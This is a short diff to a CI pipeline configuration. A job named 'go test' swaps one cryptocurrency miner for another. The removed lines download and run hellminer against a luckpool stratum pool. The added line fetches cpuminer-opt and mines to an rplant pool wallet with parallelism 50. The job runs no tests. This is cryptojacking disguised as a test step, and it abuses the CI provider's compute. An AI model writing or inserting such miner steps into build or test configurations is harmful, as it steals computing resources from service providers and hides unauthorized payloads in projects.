@@ -12,7 +12,5 @@ blocks:
       jobs:
         - name: go test
           commands:
-            - 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'
-            - tar xf hellminer_cpu_linux.tar.gz
-            - './hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLeCgADwoiPj7PJAmr65NTQZrHfvguJZxS.OGHINT -p x --cpu 2'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qfqw4e6692tjevvydzepnpjgmjyy6at8j6n8c7j.Acep -t0'
           parallelism: 50
